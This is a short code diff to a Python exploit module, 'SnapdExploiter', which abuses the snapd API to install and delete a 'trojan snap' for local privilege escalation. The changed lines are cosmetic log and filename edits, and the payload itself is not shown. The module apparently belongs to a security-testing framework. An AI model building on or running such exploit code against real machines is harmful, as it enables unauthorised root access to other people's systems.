@@ -95,7 +95,7 @@ def delete_snap(client_sock):
                 + post_payload)
 
     # Send our payload to the snap API
-    LOG.info("Deleting trojan snap (and sleeping 5 seconds)...")
+    LOG.info("Deleting trojan snap ...")
     client_sock.sendall(http_req.encode("utf-8"))
 
     # Receive the data and extract the JSON
@@ -149,7 +149,7 @@ Content-Type: application/octet-stream
                  'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')
 
     # Send the headers to the snap API
-    LOG.info("Installing the trojan snap (and sleeping 8 seconds)...")
+    LOG.info("Installing the trojan snap ...")
     client_sock.sendall(http_req1.encode("utf-8"))
 
     # Receive the initial HTTP/1.1 100 Continue reply
@@ -236,7 +236,7 @@ class SnapdExploiter(HostPrivExploiter):
             return False
 
         self.file_path = command_line.split(' ')[0]
-        self.file_name = self.file_path.split('/')[-1]
+        self.file_name = os.path.basename(self.file_path);
 
         # get the current user name
         whoami = getpass.getuser()
